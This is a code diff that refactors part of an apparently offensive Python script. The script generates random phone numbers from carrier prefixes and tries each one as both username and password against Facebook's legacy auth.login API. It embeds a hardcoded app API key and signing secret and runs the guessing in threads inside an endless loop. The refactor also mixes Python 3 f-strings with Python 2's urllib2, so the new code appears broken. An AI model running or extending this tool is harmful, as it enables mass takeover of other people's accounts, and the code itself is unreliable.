@@ -25,23 +25,21 @@ def threadManager(function,Funcargs,Startthreshold,Threadtimeout=5):
 		del storeThreads[::]
 
 def accessToken(email,password):
-    data = collections.OrderedDict()
-    data["api_key"] = "882a8490361da98702bf97a021ddc14d"
-    data["email"] =  str(email)
-    data["format"]= "JSON"
-    data["locale"] = "vi_vn"
-    data["method"] = "auth.login"
-    data["password"] = str(password)
-    data["return_ssl_resources"] = "0"
-    data["v"] = "1.0"
-    sig = ""
-    for key in data:
-        sig +=  "{0}={1}".format(key,data[key])
-    data["sig"] = hashlib.md5(sig+"62f8ce9f74b12f84c123cc23437a4a32").hexdigest()
-    try:
-        return json.loads(urllib2.urlopen("https://api.facebook.com/restserver.php?{0}".format(urlencode(data))).read())["access_token"]
-    except:
-        return False
+	data = collections.OrderedDict()
+	data["api_key"] = "882a8490361da98702bf97a021ddc14d"
+	data["email"] =  str(email)
+	data["format"]= "JSON"
+	data["locale"] = "vi_vn"
+	data["method"] = "auth.login"
+	data["password"] = str(password)
+	data["return_ssl_resources"] = "0"
+	data["v"] = "1.0"
+	sig = "".join("{0}={1}".format(key,data[key]) for key in data)
+	data["sig"] = hashlib.md5(f"{sig}62f8ce9f74b12f84c123cc23437a4a32").hexdigest()
+	try:
+	    return json.loads(urllib2.urlopen("https://api.facebook.com/restserver.php?{0}".format(urlencode(data))).read())["access_token"]
+	except:
+	    return False
 
 def login(n):
 	status = accessToken(n,n)
@@ -50,8 +48,10 @@ def login(n):
 
 def GenPhoneNumber():
 	provider = providers[random.randint(0,len(providers)-1 )]
-	numbers = (''.join(random.choice(string.digits) for i in range(phoneLen - len(provider) )))
-	return "{}{}".format(provider,numbers)
+	numbers = ''.join(
+		random.choice(string.digits) for _ in range(phoneLen - len(provider))
+	)
+	return f"{provider}{numbers}"
 
 old = 0
 while(1):
